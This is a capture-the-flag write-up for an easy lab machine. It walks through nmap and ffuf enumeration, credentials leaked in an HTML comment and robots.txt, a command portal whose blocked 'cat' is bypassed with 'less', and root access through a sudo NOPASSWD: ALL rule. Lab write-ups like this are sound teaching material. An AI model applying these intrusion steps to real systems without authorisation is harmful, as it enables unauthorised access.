
**Target IP:** `10.10.84.24`
**Difficulty:** `Easy`
**Category:** Web, Privilege Escalation
______________________

## Enumeration

Initiating an nmap scan to gather the open ports

`sudo nmap -sS 10.10.84.24 -vv `

Output - 

~~~~
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60

~~~~~


Navigating to `http://10.10.84.24` displays a basic web page. Inspecting the HTML source reveals a comment:

~~~~
Note to self, remember username!
Username: R1ckRul3s

~~~~~~

This likely provides a valid username for authentication.

------------------------------------

### Web Enumeration using ffuf - 

`ffuf -u http://10.10.84.24/FUZZ -w /usr/share/wordlists/dirb/big.txt`

Output - 

~~~
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 191ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 223ms]
assets                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 181ms]
robots.txt              [Status: 200, Size: 17, Words: 1, Lines: 2, Duration: 176ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 210ms]
:: Progress: [20469/20469] :: Job [1/1] :: 135 req/sec :: Duration: [0:01:55] :: Errors: 0 ::
~~~~~

Only promising file is the robots.txt. However, it has a meaningless string. (could be a password, given the context and Rick and Morty reference.).

`Wubbalubbadubdub` 

We use a login-focused wordlist to discover login portals. - 

`ffuf -u http://10.10.84.24/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/Logins.fuzz.txt `

Discovered `login.php` page.

~~~
login.php               [Status: 200, Size: 882, Words: 89, Lines: 26, Duration: 198ms]
~~~~

-------------------------

## Exploitation

Credentials - 

~~~~
Username: R1ckRul3s
Password: Wubbalubbadubdub
~~~~~~

The `portal.php` interface provides limited command execution. 

### First Flag - 

Running `ls` reveals: 

~~~
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
~~~~~

`cat` command is blocked.  `less Sup3rS3cretPickl3Ingred.txt ` works!

The first ingredient lies in it.

The `clue.txt` file contains a hint to find the next ingredient.

~~~~
Look around the file system for the other ingredient.
~~~~~~

### Second Flag - 

Looking around the file system, we can find a directory for user `rick` which contains the second file `second ingredients`.

Navigating there reveals the second ingredient.

### Third Flag - 

Check for `sudo` permissions:

	The command `sudo -l` gives the following output - 

~~~
Matching Defaults entries for www-data on ip-10-10-84-24:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-84-24:
    (ALL) NOPASSWD: ALL
~~~~

`(ALL) NOPASSWD: ALL` means that the `www-data` user can run any command as sudo without password.

`sudo ls /root`

~~~
3rd.txt
snap
~~~~~

And the last flag lies in `3rd.txt` file. 

**Fairly simple.**
